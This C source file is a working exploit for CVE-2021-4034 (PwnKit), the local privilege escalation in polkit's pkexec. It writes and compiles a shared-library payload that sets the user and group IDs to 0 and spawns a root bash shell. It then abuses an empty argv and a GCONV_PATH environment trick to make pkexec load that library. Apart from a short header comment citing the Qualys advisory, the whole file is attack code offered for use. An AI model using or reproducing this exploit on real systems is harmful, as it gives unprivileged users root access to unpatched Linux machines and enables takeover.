//
// pwnkit.c
// pwnkit (CVE-2021-4034): 
// Local Privilege Escalation in polkit's pkexec
//
// -- lilith <0xlilith@protonmail.com>

/*
 * a Local Privilege Escalation (from any user to root) in
 * polkit's pkexec, a SUID-root program that is installed by default on
 * every major Linux distribution:
 * 
 * "Polkit (formerly PolicyKit) is a component for controlling system-wide
 * privileges in Unix-like operating systems. It provides an organized way
 * for non-privileged processes to communicate with privileged ones. [...]
 * It is also possible to use polkit to execute commands with elevated
 * privileges using the command pkexec followed by the command intended to
 * be executed (with root permission)."
 * 
 * Advisory: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *payload =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <sys/types.h>\n"     
    "void _init(){\n"
    "setgid(0);\n"
    "setuid(0);\n"
    "setegid(0);\n"
    "seteuid(0);\n"
    "system(\"/bin/bash\");\n"
    "}";
 
int main(void) {
    FILE *file;
    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
    file = fopen("pwnkit/pwnkit.c", "w");
    fprintf(file, "%s", payload);
    fclose(file);
    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
    char * const args[] = { NULL };
    char * const env[]  = { 
        "pwnkit", 
        "PATH=GCONV_PATH=.", 
        "CHARSET=PWNKIT", 
        "SHELL=pwnkit", 
        0
     };
    execve("/usr/bin/pkexec", args, env);
}